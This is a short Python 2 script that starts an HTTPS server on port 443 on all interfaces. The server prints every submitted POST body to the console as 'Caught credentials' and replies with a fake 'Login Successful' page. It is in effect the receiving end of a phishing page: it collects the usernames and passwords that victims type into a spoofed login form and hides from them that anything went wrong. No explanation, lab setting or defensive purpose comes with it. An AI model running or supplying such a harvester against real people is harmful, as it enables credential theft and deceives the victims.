import BaseHTTPServer
import SimpleHTTPServer
import ssl

class MyHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.getheader('Content-Length'))
        post_data = self.rfile.read(length)
        print("\n[+] Caught credentials:", post_data)

        # Respond with a simple page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write("<html><body><h1>Login Successful</h1></body></html>")

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MyHandler)
httpd.socket = ssl.wrap_socket(
    httpd.socket,
    certfile='cert.pem',
    keyfile='key.pem',
    server_side=True
)
print("[*] HTTPS server running on port 443...")
httpd.serve_forever()
